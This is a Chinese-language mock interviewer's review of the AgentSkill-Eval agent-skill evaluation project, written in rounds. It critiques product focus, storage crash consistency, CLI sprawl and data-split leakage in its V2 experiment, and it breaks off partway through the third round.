# AgentSkill-Eval 面试官深度审视

> 目标岗位：AI Agent 开发  
> 评审身份：秋招技术面试官  
> 评审方式：分轮分析，持续追加  
> 当前代码基线：`main@67479ba`  
> V2 状态：实验进行中，不把“结果尚未冻结”本身计为缺陷

---

# 总体评审计划

| 轮次 | 主题 | 状态 |
|---|---|---|
| 第 1 轮 | 项目定位、功能闭环、用户体验、拼凑风险 | 已完成 |
| 第 2 轮 | 核心技术实现、模块边界、架构复杂度 | 待进行 |
| 第 3 轮 | 评测科学性、数据设计、V2 实验有效性 | 待进行 |
| 第 4 轮 | 工程实践、可靠性、安全、可维护性 | 待进行 |
| 第 5 轮 | 创新性、竞品差异、简历可信度、面试风险 | 待进行 |
| 第 6 轮 | 问题优先级、改造路线、模拟面试 | 待进行 |

---

# 第 1 轮：项目定位与功能设计

## 1. 面试官初筛结论

一句话评价：

> 这是一个实验协议和证据控制较完整的 Agent Skill 评测研究原型，但产品主线被大量控制面、扩展场景和发布协议稀释，用户要完成一次真实 Skill 改进仍然需要理解过多内部概念。

当前最明显的矛盾：

```text
对外叙事：
自动评测、失败诊断、Skill 优化、可信发布平台

真实使用体验：
准备多个 YAML/目录/哈希
-> 选择大量 CLI 子命令
-> 手工传递阶段产物
-> 导出 JSON
-> 手工导入只读 Dashboard
-> 阅读文档判断下一步
```

这不是“功能不存在”，而是“功能没有被组织成一条低认知负担的用户旅程”。

## 2. 初步评分

以下是第一轮印象分，不是最终分数：

| 维度 | 初步分数 | 面试官判断 |
|---|---:|---|
| 问题价值 | 8/10 | Skill 边际价值评测是真问题 |
| 功能完整度 | 6/10 | 协议完整，用户闭环割裂 |
| 产品体验 | 4.5/10 | 主要面向项目作者，不面向普通 Skill 开发者 |
| 工程可信度 | 7.5/10 | 测试、CI、状态机和证据边界较扎实 |
| 创新表达 | 6.5/10 | 有差异点，但被功能数量淹没 |
| 简历说服力 | 6/10 | 有深度，需降低“生成式大平台”观感 |

## 3. 项目真正的核心用户是谁

当前文档隐含了三个用户：

1. Skill 作者：想知道 Skill 有没有用；
2. Agent 评测研究者：想做可控实验；
3. 平台工程师：想管理证据、预算和发布状态。

三类用户的需求不同：

| 用户 | 最关心什么 |
|---|---|
| Skill 作者 | 如何快速跑一次 before/after，哪里退化 |
| 评测研究者 | 实验协议、统计、数据泄漏、证据 |
| 平台工程师 | 状态机、恢复、权限、发布、审计 |

当前实现明显更偏向第 2、3 类，但 README 开头又像在服务所有 Skill 作者。

### 问题

没有明确首要用户会导致：

- CLI 同时承担研究、运维和演示入口；
- Dashboard 同时展示实验、Trace、Benchmark、Promotion；
- README 同时解释产品、论文方法和内部状态；
- 新功能容易按“平台应该有”继续增加。

### 改进

秋招版本建议明确：

> 第一用户是需要验证 Python Bug Fix Skill 的 Agent/Skill 开发者。

其他用户降级：

- 研究者能力作为 Advanced Mode；
- 平台工程能力作为内部实现；
- MCP/RAG 作为 Experimental。

## 4. 核心用户旅程不完整

一个合理的目标旅程应该是：

```text
给定 SKILL.md 和任务集
-> 校验数据
-> 跑 baseline
-> 跑 paired evaluation
-> 查看 Win/Loss/Invalid
-> 选择失败证据
-> 生成候选
-> 搜索和回归
-> 查看是否可晋级
-> 发布或拒绝
```

当前代码具备这些能力，但用户需要跨越 84 个 CLI 命令和多个命令组。

### 面试官会问

> 如果我是第一次使用，你告诉我应该依次执行哪五条命令？

如果回答需要打开 5 篇文档或解释 Stage 3A/3B/3C，产品抽象就还没有完成。

### 改进：增加面向任务的 Facade

保留底层细粒度命令，但新增六个顶层命令：

```text
agentskill-eval init
agentskill-eval baseline
agentskill-eval compare
agentskill-eval evolve
agentskill-eval inspect
agentskill-eval promote
```

示例：

```bash
agentskill-eval evolve experiment.yaml \
  --workspace .agentskill-eval/run-001 \
  --budget-usd 5 \
  --stop-before-locked
```

内部仍可调用原有状态机，但普通用户不需要理解每个内部阶段的命令名。

## 5. Dashboard 是证据查看器，不是完整产品界面

当前 Dashboard 的真实能力：

- 浏览器本地导入 JSON、patch、sha256；
- 加载 Synthetic Demo；
- 展示 Experiment、Trace、Benchmark、Search、Promotion；
- 不上传、不执行、不修改 Manifest。

这个只读边界是正确的安全选择，但体验存在明显断点：

```text
CLI 执行
-> 用户寻找报告路径
-> 手工选择多个文件或目录
-> 浏览器解析
```

### 不足

- 不能直接选择 workspace 并建立一致视图；
- 不能自动关联 Experiment、Search、Promotion 的 lineage；
- 不能显示实时执行进度；
- 不能从 UI 触发安全的只读 verify；
- 证据文件缺失时，用户难以知道应该生成哪个文件；
- 页面功能很多，但缺少“本次实验下一步做什么”的引导。

### 改进

保持只读原则，增加本地服务：

```bash
agentskill-eval dashboard serve WORKSPACE
```

本地服务只提供：

- workspace 索引；
- 报告读取；
- hash verify；
- artifact 安全下载；
- live progress SSE；
- next-action recommendation。

所有写操作仍回到 CLI，并要求显式确认。

## 6. 功能存在明显的“平台化过早”

当前仓库同时包含：

- Python Bug Fix；
- MCP Tool Use；
- Memory/RAG；
- unified scenarios；
- Benchmark 生成；
- failure bridge；
- proposal；
- search；
- final evaluation；
- promotion；
- evidence release；
- evolution timeline；
- API/Worker/Deployment/Migration 占位。

其中 Python Bug Fix 有真实主线，MCP/RAG 主要是离线 Lab，API/Worker/Deployment 基本为空。

### 面试官观感

> 你是在深入解决一个问题，还是看到 Agent 平台常见名词后逐项补模块？

功能越多，不一定越有说服力。没有真实证据的模块会稀释真正有价值的部分。

## 7. 功能去留建议

### 7.1 简历主线保留

| 功能 | 建议 | 原因 |
|---|---|---|
| Paired Experiment | 强保留 | 项目题眼 |
| PASS/FAIL/INVALID | 强保留 | 最清晰的设计价值 |
| Runner Adapter | 强保留 | Agent 开发岗位相关 |
| Trace/Failure Diagnosis | 强保留 | 体现过程评测 |
| Git Benchmark | 强保留 | 核心数据资产 |
| Search/Regression | 强保留 | 支撑 V2 |
| Evidence Manifest | 保留 | 体现工程严谨性 |

### 7.2 降为 Experimental

| 功能 | 原因 |
|---|---|
| MCP Lab | 尚无真实生产 Server 评测 |
| Memory/RAG Lab | 与 Bug Fix 主线跨度大 |
| Unified Multi-Scenario | 抽象先于真实场景成熟 |
| Evolution Timeline | 展示价值大于核心能力 |

### 7.3 删除或移出主仓库视野

| 内容 | 原因 |
|---|---|
| 空 FastAPI 目录 | 暗示未完成平台 |
| 空 Worker 包 | 暗示服务化但无实现 |
| Deployment 占位 | 增加脚手架感 |
| Migration 占位 | 当前真值不依赖服务数据库 |
| 过时 E2E README | 与现状不一致 |

可以移动到：

```text
docs/roadmap/service-control-plane.md
```

不必保留空目录证明“未来会做”。

## 8. “自动优化”表述与真实行为不一致

当前优化链存在大量正确但人工化的步骤：

- 手工选择/审核 failure；
- 显式授权 proposal；
- 显式授权 search；
- 显式授权 regression；
- 手工准备 confirmation handoff；
- 显式人工 approve。

这适合称为：

> 证据约束的半自动 Skill 演化工作流。

不适合直接称为：

> 全自动 Skill 优化平台。

### 改进

把自动化层级写进状态：

| 级别 | 含义 |
|---|---|
| L0 | 手工分析和修改 |
| L1 | 自动候选生成，人工选择 |
| L2 | 自动 search/regression，人工终评 |
| L3 | 自动 confirmation，人工发布 |

当前项目大致处于 L2，而不是完全自动。

## 9. Benchmark Onboarding 成本过高

自动 Benchmark 生成器很强，但创建新 Case 仍需要理解：

- Git bundle；
- before/after commit；
- patch family；
- grader；
- mutation；
- alternative repair；
- split plan；
- provenance；
- license；
- DatasetVersion publish。

这是研究者能接受的流程，但普通 Skill 作者很难快速上手。

### 改进

增加向导：

```bash
agentskill-eval benchmark wizard REPO_URL FIX_COMMIT
```

输出：

- 自动推断父 commit；
- 识别修改文件；
- 提取候选测试；
- 生成待填写 alternative repair；
- 运行四态检查；
- 生成人工 Review checklist；
- 最终输出可编辑 spec。

不要试图完全自动批准 Case，但应自动生成 80% 的骨架。

## 10. Promotion 功能对普通用户过重

当前 Promotion 强调：

- confirmation；
- locked receipt；
- parent hash；
- human review；
- immutable SkillVersion；
- rollback pointer；
- release evidence。

这些设计严谨，但如果用户只是比较一个本地 Skill，它们显得过重。

### 改进：双模式

```text
Research Mode:
compare -> report

Release Mode:
search -> regression -> confirmation -> locked -> promote
```

让用户在一开始选择目标：

- “我只想评测”；
- “我想优化候选”；
- “我准备正式发布”。

不要强迫所有用户走完整发布协议。

## 11. 结果发现性不足

仓库已经积累很多实验目录，但用户要回答以下问题并不容易：

- 当前哪一个是最新真实实验？
- 哪一个结果已被更正？
- 哪一个 winner 仍然有效？
- 哪一个数据集已经 burn？
- V2 当前在哪个阶段？

README、项目状态文档、实验目录和分支可能出现不同口径。

### 改进：单一状态索引

增加机器生成：

```text
experiments/index.json
experiments/index.md
```

每行包含：

- evidence class；
- dataset；
- model；
- stage；
- status；
- supersedes；
- claim limit；
- branch/commit；
- verified at。

README 只引用索引，不手工复制多套状态。

## 12. Release 与 main 的时间线不清晰

当前 `v0.3.0-rc1` 发布后，`main` 又增加了大量代码和实验；同时 V2 相关证据在独立分支继续推进。

面试官打开 Release 和 main，可能看到不同：

- 测试数量；
- 功能状态；
- 实验结果；
- README 表述。

### 改进

- V2 实验完成前创建 `v0.4.0-rc1` milestone；
- 所有 V2 输入绑定明确 commit；
- 实验结束后一次性合入证据和状态；
- 发布新的 RC；
- README 顶部标记 `main` 与 latest release 的差异。

## 13. V2 当前进展的面试官判断

最新未合并分支显示：

```text
Qwen3-32B-AWQ 本地 baseline screening
8 planned / 8 valid / 0 invalid
baseline = 0/4
treatment = 1/4
W/T/L = 1/3/0
```

同时：

```text
Token overhead ≈ +218%
Latency overhead ≈ +627%
```

基于三个真实 treatment failure，DeepSeek 生成了四个 VERIFICATION 候选；公开分支快照中 search 尚未执行。你说明当前测试正在运行，因此本评审把后续结论标为 pending。

### V2 不能只看成功率

候选即使获得更多 Win，也必须回答：

- Token 和时延是否下降到可接受范围？
- 失败是否来自 Skill 可改变行为？
- 是否只是反复跑测试换成功？
- 新 Skill 是否对 4 个 Funcy Case 过拟合？
- 是否在其他仓库保持效果？
- control/treatment 是否使用同样 max turns 和工具预算？

### V2 当前最重要的记录

每一阶段都应冻结：

```text
base skill hash
candidate skill hash
dataset hash
model/runner version
generation parameters
run budget
execution order
PASS/FAIL/INVALID
token/latency/cost
W/T/L
claim limit
```

V2 仍在运行不是问题；运行后无法证明比较公平，才是问题。

## 14. 功能拼凑风险矩阵

| 功能 | 与题眼相关性 | 当前证据 | 风险 |
|---|---:|---:|---|
| Paired Evaluation | 高 | 高 | 低 |
| Git Benchmark | 高 | 高 | 低 |
| Failure Diagnosis | 高 | 中 | 中 |
| Skill Search | 高 | 中 | 中 |
| Promotion Protocol | 中 | 模拟为主 | 中 |
| Dashboard | 中 | UI 测试完整 | 中 |
| MCP Lab | 低 | 离线 | 高 |
| Memory/RAG Lab | 低 | 离线 | 高 |
| API/Worker/Deploy | 低 | 占位 | 很高 |

判断原则：

> 与“隔离 Skill 边际价值”没有直接关系、又缺少真实证据的功能，应从简历主叙事移除。

## 15. 第一轮 P0/P1/P2 改进清单

### P0：V2 冻结前完成

1. 明确第一用户和唯一主场景：Python Bug Fix Skill。
2. 给 V2 建立单页状态卡，所有阶段只引用这一真值。
3. 记录 V2 的效率代价，不只记录成功率。
4. 把“自动优化”改为“证据约束的半自动演化”。
5. 清理 README 中冲突或过期状态。

### P0：写简历前完成

1. 提供一条 5～6 命令以内的真实用户旅程。
2. README 首屏只保留问题、方法、真实结果、边界。
3. 把 MCP/RAG 标为 Experimental，不进入主亮点。
4. 移除空 API/Worker/Deployment/Migration 目录。
5. 新建 release，避免 latest release 与 main 差距过大。

### P1：提高使用体验

1. `dashboard serve WORKSPACE`；
2. 自动实验索引；
3. benchmark wizard；
4. 缺失证据和 next action 提示；
5. Research Mode 与 Release Mode 分层。

### P2：V2 后再考虑

1. MCP 真实 Server；
2. RAG 真实 Retriever；
3. 多用户控制面；
4. 远程 Worker；
5. Kubernetes。

## 16. 第一轮面试追问

你需要能在不看文档时回答：

1. 这个系统的第一用户是谁？
2. 用户从一个 `SKILL.md` 到评测报告最少执行几步？
3. 为什么有 84 个 CLI 命令？
4. Dashboard 为什么只读？它解决了什么核心问题？
5. MCP/RAG 和 Python Bug Fix 主线有什么共同抽象？
6. 哪些模块是真实运行，哪些只是离线 Lab？
7. 你的“自动优化”自动到什么程度？
8. V2 成功率提升但 Token 增加 3 倍，你是否发布？
9. 为什么不直接使用 LangSmith、Braintrust 或 OpenAI Evals？
10. 如果只能保留三个模块，你保留什么？

推荐第 10 题答案：

> PairBlock 配对实验、Git Benchmark、Runner/Evidence。它们分别解决因果比较、任务真值和执行可审计，是项目最不可替代的三部分。

---

# 第 1 轮结论

项目当前不是“功能少”，而是“功能层级没有收敛”。

最优方向不是继续补平台模块，而是：

```text
聚焦一个用户
-> 固定一个真实场景
-> 打通一条低认知负担旅程
-> 用 V2 证明闭环
-> 再把底层严谨性作为架构亮点
```

完成这一步后，面试官看到的会从“功能很多的 AI 生成平台”转变为“围绕 Agent Skill 边际价值做深的评测系统”。

---

# 第 2 轮：技术实现与架构审视

## 17. 本轮结论

一句话评价：

> 核心实验引擎具备认真设计过的状态机和证据模型，但外围 Benchmark、Optimizer、Promotion 各自发展出独立 Store 和 Workflow，导致可靠性能力没有统一下沉，`skill_optimizer` 最终成为承担过多职责的超级包。

本轮不会把以下内容当作缺陷：

- 当前是单机本地系统；
- 没有 Redis/Celery；
- 没有 Kubernetes；
- 没有多租户；
- 主要支持 POSIX。

这些是明确范围。真正的问题是：

> 在“单机、POSIX、本地不可变证据”的既定边界内，不同模块是否遵守同一套一致性和依赖规则。

## 18. 技术实现中值得肯定的部分

### 18.1 Experiment Core 的对象拆分合理

```text
Experiment
-> Variant
-> PairBlock
-> Run
-> Attempt
-> Measurement/Evidence
```

这组对象能清楚表达：

- 实验身份；
- 配对关系；
- 逻辑执行与物理尝试；
- 状态迁移；
- 结果与效率指标。

### 18.2 UUIDv5 和 Fingerprint 有明确用途

它们不是为了“技术炫技”，而是用于：

- 确定性规划；
- 幂等重放；
- 防止旧 Run 接受新配置结果；
- 检测实验输入漂移。

### 18.3 Run/Attempt 存储具有真实故障注入测试

`tests/unit/test_storage.py` 覆盖：

- 终态对象不可修改；
- stale lease generation；
- 在发布 Run pointer 前崩溃；
- 临时文件恢复；
- 冲突文件隔离；
- SQLite 索引重建。

这类测试比单纯 Happy Path 测试更能体现工程能力。

### 18.4 Runner Adapter 是正确边界

实验核心不直接理解 `skill-up` CLI，而是通过：

```text
RunnerRequest
RunnerResult
RunnerEvent
ValidationReport
```

隔离外部变化。这是本项目最适合在架构面试中展开的部分。

### 18.5 能力不可观测时显式 unavailable

系统没有把“安装了 Skill”推断成“Agent 读取并遵循了 Skill”，避免伪造观测事实。

## 19. P0：候选快照存在多文件崩溃不一致

BenchmarkStore 和 OptimizationStore 都采用：

```python
write(history_snapshot)
write(current_candidate)
```

第二次写之前崩溃会得到：

```text
history/0003.json 已存在
candidate.json 仍是旧版本
```

重试时又会因为 `history/0003.json` 已存在而直接拒绝。

结果：

- transition history 比 current pointer 新；
- 普通重试无法自动修复；
- job 可能永久卡住；
- “单文件原子写”没有覆盖“多文件状态提交”。

### 为什么严重

候选 transition 是 Benchmark 和 Skill Search 的核心状态。如果在真实付费搜索后崩溃，可能出现：

- 模型费用已发生；
- immutable snapshot 已写；
- current job 仍认为阶段未完成；
- 重放因 snapshot 已存在而失败。

### 修复方案 A：History 作为唯一真值

推荐：

```text
只原子写 immutable history/N.json
current candidate = 读取序号最大的有效 snapshot
```

`candidate.json` 只作为可重建缓存，类似 SQLite index。

优点：

- 一次 transition 只有一个真值写入；
- 不需要跨文件事务；
- latest pointer 损坏可重建；
- 更符合 append-only audit log。

### 修复方案 B：增加幂等修复

如果保留 current pointer：

1. snapshot 已存在时读取并比较内容；
2. 内容相同则允许修复 current pointer；
3. 内容不同则报告 conflict；
4. 增加 `recover()` 扫描 history/current 差异。

### 必补测试

```text
crash after history write
crash before current pointer
same snapshot idempotent retry
conflicting snapshot rejection
current pointer reconstruction
```

## 20. P0：DatasetVersion 发布不是目录级原子操作

当前逻辑：

```text
copytree(staging, destination)
-> write(destination/dataset-version.json)
```

如果在 copytree 后、Manifest 写入前崩溃：

- destination 已存在；
- Manifest 缺失；
- 下次发布因为 destination exists 被拒绝；
- 产生不可读取又不可重试的残缺 DatasetVersion。

### 修复

```text
创建同文件系统 .tmp-release-UUID
-> copy 全部文件
-> 写 Manifest 和 sidecar
-> 校验成员集合和哈希
-> fsync 文件和目录
-> rename 到最终 DatasetVersion 目录
```

最终目录只有两种状态：

- 完整不存在；
- 完整可见。

## 21. P0：子进程 stdout/stderr 没有内存上限

`ProcessSupervisor` 使用：

```python
stdout=PIPE
stderr=PIPE
await process.communicate()
```

这会把全部输出收集到内存，再解码为字符串。

Agent、测试框架或错误循环可能产生大量输出，导致：

- Runner 进程正常受 timeout 控制；
- 但控制进程内存先被输出撑满；
- Secret 扫描和 artifact 归档进一步复制字节；
- 单个恶意/异常 Case 影响整个实验。

### 修复

使用有界流式读取：

```text
stdout reader task
stderr reader task
-> 增量 hash
-> 增量 Secret scan
-> 写临时 artifact
-> 超过 max_output_bytes 时截断并标记
```

需要冻结：

- `max_stdout_bytes`；
- `max_stderr_bytes`；
- `truncated`；
- `dropped_bytes`；
- 完整流 SHA-256 是否可用。

超限是否 INVALID 应在协议中预注册。

## 22. P1：可靠性能力只集中在 ExperimentStore

`LocalExperimentStore` 具有：

- layout；
- lock；
- atomic writer；
- immutable manifest；
- recovery；
- SQLite rebuild；
- fault injection。

但外围又分别实现：

- `BenchmarkStore`；
- `OptimizationStore`；
- `FinalEvaluationStore`；
- `PromotionWorkflowStore`；
- `SkillVersionPromotionStore`；
- `RegressionOpportunityStore`。

这些 Store 对原子性、幂等和恢复的实现不完全一致。

### 架构问题

项目表面上有统一 Evidence 模型，但持久化协议没有成为统一基础设施。

### 改进

抽取独立基础包：

```text
packages/storage_core/
├── atomic.py
├── envelopes.py
├── append_log.py
├── immutable_tree.py
├── content_store.py
├── recovery.py
└── locks.py
```

每个领域包只定义：

- 路径规则；
- 模型类型；
- transition invariant。

不要各自重新实现“history + current + hash”。

## 23. P1：Experiment 包同时承担领域和基础设施

`benchmark_gen` 和 `skill_optimizer` 直接导入：

```text
agentskill_eval_experiment.storage.atomic
agentskill_eval_experiment.storage.manifests
```

这意味着：

```text
Benchmark Domain -> Experiment Infrastructure
Optimizer Domain -> Experiment Infrastructure
```

`experiment` 不再只是实验 bounded context，也成了公共 infra 工具箱。

### 风险

- Experiment storage 改动影响 Benchmark/Optimizer；
- 包名不能反映真实职责；
- 依赖方向难以解释；
- 未来服务化时难以替换存储。

### 改进后的依赖方向

```text
contracts
   ^
   |
storage_core
   ^
   |
experiment / benchmark / optimization / promotion
   ^
   |
application workflows
   ^
   |
CLI
```

领域包之间尽量通过明确 contract 连接，不直接复用对方私有基础设施。

## 24. P1：skill_optimizer 已成为超级包

规模约：

```text
skill_optimizer: 10,733 lines
experiment:       3,455 lines
benchmark_gen:    3,455 lines
```

它同时负责：

- failure bridge；
- hypothesis generation；
- DeepSeek API；
- candidate evaluation；
- search；
- regression；
- opportunity gate；
- dry run；
- execution plan；
- execution runtime；
- final evaluation；
- promotion；
- observed promotion；
- evidence release。

这些不是一个单一职责。

### 后果

- 模块名称无法表达边界；
- `__init__.py` 公开接近整个系统；
- 一个 package 的测试和变更范围过大；
- proposal/search/final/promotion 的术语容易重复；
- 新开发者难以找到唯一入口。

### 建议拆分

```text
packages/
├── failure_analysis/
├── candidate_generation/
├── candidate_search/
├── final_evaluation/
├── skill_registry/
└── evolution_workflow/
```

如果不想增加物理 package，至少在 `skill_optimizer` 内按 bounded context 分子包，而不是继续增加平级大文件。

## 25. P1：存在多套相近 Workflow

当前可见概念包括：

- `FailureGuidedSkillEvolution`；
- `EvolutionDryRunOrchestrator`；
- `RealEvolutionExecutionPlanner`；
- `BudgetedRealEvolutionExecutor`；
- `PromotionWorkflow`；
- `ObservedPromotionWorkflow`；
- `SkillVersionPromotionCore`。

每个名字单独合理，但整体上会产生问题：

- 哪个是主工作流？
- 哪个只负责规划？
- 哪个会产生真实费用？
- 哪个只是 Fixture？
- 哪个状态是全局真值？

### 改进

定义唯一顶层 Saga：

```text
EvolutionRun
├── BASELINE
├── FAILURE_REVIEW
├── PROPOSAL
├── SEARCH
├── REGRESSION
├── CONFIRMATION
├── LOCKED
└── PROMOTION
```

各模块只执行一个 Stage，并返回统一 `StageResult`。

Dry run、simulated、observed 应是 execution mode，不应形成多套平行工作流类。

## 26. P1：CLI 是 Composition Root，但已经失控

`apps/cli/agentskill_eval_cli/main.py`：

- 2,684 行；
- 84 个 command；
- 29 个 Typer group；
- 启动时 eager import 几乎所有 package。

Composition Root 集中依赖本身没有错，问题是命令定义、参数、业务编排和输出格式全在一个文件。

### 风险

- Merge 冲突集中；
- 任一 package import 错误导致所有命令不可用；
- CLI 启动加载不相关模块；
- 难以为命令组定义独立测试和帮助文档；
- 用户无法识别主路径。

### 拆分

```text
apps/cli/agentskill_eval_cli/
├── app.py
├── dependencies.py
├── commands/
│   ├── evaluate.py
│   ├── benchmark.py
│   ├── evolve.py
│   ├── promote.py
│   ├── inspect.py
│   └── admin.py
└── presenters/
    ├── json.py
    └── terminal.py
```

顶层 `app.py` 只负责注册命令。

## 27. P1：公共 API 面过大

`contracts/__init__.py` 和 `skill_optimizer/__init__.py` 重新导出大量类型。

优点：

- import 简短；
- 早期开发方便。

代价：

- 所有类型看起来都是稳定公共 API；
- 很难判断内部/外部类型；
- 修改模块容易影响 barrel import；
- 文档和 IDE 自动补全噪声大；
- 包初始化会导入大量子模块。

### 改进

只导出稳定 Port：

```python
from agentskill_eval.api import (
    EvaluationService,
    EvolutionService,
    ExperimentSpec,
    EvaluationReport,
)
```

内部领域对象从具体模块导入，不承诺全部长期兼容。

## 28. P1：最低 Python 版本没有在 CI 验证

声明：

```text
requires-python >= 3.9
mypy python_version = 3.9
```

CI 只运行 Python 3.11。

风险：

- 类型检查目标是 3.9，不代表运行时真的兼容；
- 新语法/API 可能在 3.11 CI 通过，在 3.9 失败；
- Release 对外承诺大于实际验证范围。

### 改进

CI matrix：

```text
Python 3.9  -> tests + wheel install
Python 3.11 -> lint + mypy + full tests
Python 3.12 -> tests
```

或者把最低版本明确提高到 3.11，减少兼容负担。

## 29. P1：平台兼容边界需要更明确

源码使用：

- POSIX advisory lock；
- `os.killpg`；
- `SIGTERM/SIGKILL`；
- `ps -eo pid,ppid,pgid`；
- directory fsync。

文档已经说明目标是 macOS/Linux，但包元数据和安装入口没有明显阻止 Windows。

### 改进

二选一：

1. 明确声明 `Operating System :: POSIX`，启动 preflight 拒绝 Windows；
2. 抽象 `ProcessBackend` 和 `LockBackend`，实现 Windows Job Object。

秋招项目推荐第一种，诚实限定范围，不必为了“跨平台”增加无效复杂度。

## 30. P1：ProcessSupervisor 的边界风险

### 30.1 重复 execution_id

内部字典直接：

```python
self._processes[execution_id] = process
```

如果并发提交相同 ID，后者覆盖前者句柄。

应在启动前拒绝：

```text
execution_id already active
```

### 30.2 子进程逃逸

通过一次 `ps` 快照发现 descendant process group，存在竞态：

- 快照后新建孙进程；
- 子进程重新 daemonize；
- 进程脱离原 session。

对于受控 Runner 可接受，但不能宣称强沙箱。

### 30.3 输出与时间边界

timeout 控制了时间，却没有同时控制：

- 输出字节；
- 文件总大小；
- CPU；
- 内存；
- 进程数。

应把这些 capability/limit 写入真实 Sandbox Profile，而不是只记录声明字段。

## 31. P2：领域模型数量过多，存在协议对象化倾向

Contracts 包有大量：

- Profile；
- Receipt；
- Snapshot；
- Evidence；
- Manifest；
- Report；
- Result；
- Spec。

严谨是优点，但要警惕：

> 每出现一个流程步骤就新增一个对象，最终模型数量超过业务概念数量。

判断是否需要新模型：

1. 是否拥有独立 invariant？
2. 是否需要独立版本化？
3. 是否跨持久化边界？
4. 是否被两个以上模块消费？
5. 是否只是同一对象在不同阶段的字段子集？

后者可以用统一 StageResult 或 discriminated union，降低映射成本。

## 32. P2：MCP 与 Memory/RAG 存在平行实现重复

两个 Lab 分别实现：

- contracts；
- adapters；
- evaluation；
- experiment。

Scenario 包又在上层统一它们。

这说明抽象提取顺序可能反了：

```text
先分别实现两个 Lab
-> 再增加 unified scenario
-> 旧 Lab 仍保留完整执行层
```

结果是三层入口并存。

改进：

- 保留 Scenario Runtime；
- MCP/RAG 只提供 Environment Adapter + Grader；
- 删除各自重复的 Experiment orchestration；
- 所有场景统一复用 PairBlock/Run/Attempt。

但这应排在 Python Bug Fix V2 完成之后。

## 33. 建议目标架构

```text
                    CLI / Dashboard
                          |
                    Application API
                 evaluate / evolve / inspect
                          |
        +-----------------+-----------------+
        |                 |                 |
 Experiment Domain  Benchmark Domain  Evolution Domain
        |                 |                 |
        +-----------------+-----------------+
                          |
                 Stable Contracts / Ports
                          |
        +-----------------+-----------------+
        |                 |                 |
 Runner Adapters    Storage Core     Provider Adapters
```

依赖原则：

- Domain 不依赖 CLI；
- Domain 不依赖具体 Runner；
- Benchmark 不依赖 Experiment 私有 storage；
- Optimizer 不重新实现存储事务；
- Application Workflow 组合领域服务；
- CLI 只解析参数和展示结果。

## 34. 第 2 轮改进优先级

### P0：V2 继续运行前

1. 修复候选 history/current 崩溃一致性；
2. DatasetVersion 改为目录级 staging + rename；
3. 给 ProcessSupervisor 增加输出上限；
4. 为上述三项补 fault-injection test。

### P1：写简历前

1. 拆分 CLI；
2. 收缩 `skill_optimizer` 职责；
3. 提取 `storage_core`；
4. 增加 Python 版本矩阵或提高最低版本；
5. 明确 POSIX only；
6. 拒绝重复 active execution ID。

### P2：V2 完成后

1. 合并 MCP/RAG 平行 orchestration；
2. 缩小公共 barrel exports；
3. 收敛 Spec/Manifest/Receipt 模型；
4. 统一顶层 Evolution Saga。

## 35. 第 2 轮面试追问

1. 你的原子写能保证多个文件一起提交吗？
2. history 已写、current 未写时如何恢复？
3. DatasetVersion 发布一半崩溃怎么办？
4. Runner 无限输出会发生什么？
5. 为什么 Benchmark 依赖 Experiment storage？
6. `skill_optimizer` 为什么超过一万行？
7. DryRun、RealPlan、RealExecutor、PromotionWorkflow 谁是主状态机？
8. 为什么支持 Python 3.9，却只在 3.11 测试？
9. Windows 能运行吗？不能的话为什么不在安装时拒绝？
10. 如果新增第二个 Runner，需要修改哪些模块？
11. 如果 SQLite 删除，哪些对象能恢复？
12. 你如何防止两个 Worker 同时执行一个 Run？

第 1 题推荐回答：

> 当前 AtomicFileWriter 只保证单文件替换。ExperimentStore 通过发布顺序和 recovery 处理 Run/Attempt，但 Benchmark/Optimization 的 history 与 current 是两次独立写，存在崩溃窗口。我会将 immutable history 设为唯一真值，并让 current pointer 可重建。

---

# 第 2 轮结论

项目技术实现不是“没有架构”，而是：

> 核心架构较强，外围扩张速度超过了基础设施抽象收敛速度。

最有价值的改造不是增加新框架，而是把已经在 ExperimentStore 中证明有效的：

- 原子提交；
- 幂等恢复；
- fault injection；
- immutable history；
- index rebuild；

统一下沉到 Benchmark、Optimizer 和 Promotion。

做到这一点后，项目会从“很多严谨模块的集合”变成“遵守同一可靠性协议的系统”。

---

# 第 3 轮：评测科学性与 V2 实验审视

## 36. 本轮结论

一句话评价：

> 项目对“证据边界”有较强意识，但当前 V2 数据流存在 split 语义漂移、Smoke 被当作完整 baseline、失败结果被过度归因为 Verification，以及跨阶段 W/T/L 定义不一致的问题；这些比模型分数高低更优先修复。

本轮不评价“V2 为什么还没跑完”，只评价：

- 当前输入是否合格；
- 数据是否泄漏；
- 比较是否公平；
- 指标是否一致；
- 结果最终能够支持什么声明。

## 37. 当前 V2 证据事实

未合并分支当前记录：

```text
Model: Qwen3-32B-AWQ 本地服务
Repository: Funcy
Cases: 4
Runs: 8
Baseline: 0/4
Skill v1: 1/4
W/T/L: 1/3/0
Invalid: 0
```

效率：

```text
Baseline mean tokens:   53,555.75
Treatment mean tokens: 170,354.75
Token ratio:             3.18x

Baseline latency:  28,325 ms
Treatment latency: 205,981 ms
Latency ratio:       7.27x
```

失败桥从三个 treatment failures 生成三个 `VERIFICATION` finding，随后 DeepSeek 生成四个候选。

## 38. P0：当前 Funcy 数据发生 split 语义漂移

Funcy DatasetVersion 最初明确发布为：

```text
target_split: regression_dev
```

但 `ObservedFailureEvidenceBridge`：

- 不加载 DatasetVersion split；
- 不校验源数据是否为 train；
- 不校验 exposure 状态；
- 直接构造 `FailureEvidenceBundle(split="train")`。

也就是说：

```text
regression_dev failures
-> Failure Bridge
-> train bundle
-> Candidate Proposal
```

### 为什么这是数据泄漏

一旦候选生成器看到了某个 Case 的失败信号，这个 Case 就已经参与优化。

后续再用相同 Case 判断：

- regression；
- confirmation；
- locked test；

都不能算独立证据。

即使没有把完整 grader 交给 LLM，只要失败类型和结果影响了候选生成，这些数据就已经暴露。

### 当前代码中的具体问题

代码注释写：

```text
Build train-only optimizer evidence
```

但实现只把输出字段写成 `train`，没有证明输入真的是 train。

这是“字段标签正确，数据谱系错误”。

### 修复

Failure Bridge 必须：

1. 加载 Experiment 绑定的 DatasetVersion；
2. 校验 `dataset_version_id` 和 hash；
3. 读取每个 Case 的原始 split；
4. 只接受 `train`；
5. 或显式执行不可逆 `burn-to-train`；
6. 将 exposure transition 写入审计日志。

## 39. 已暴露 Funcy Case 应该怎样处理

当前四个 Funcy Case 已经：

- 被用于 baseline screening；
- 产生 treatment failure；
- 影响候选 proposal。

因此它们现在只能作为：

```text
train / failure-analysis data
```

不能继续作为：

- V2 regression_dev；
- validation_confirm；
- locked_test。

正确处理：

```text
原 DatasetVersion:
regression_dev / SEALED

发生 observed failure bridge:
BURNED_FOR_OPTIMIZATION

新 DatasetVersion:
train / EXPOSED

后续 regression:
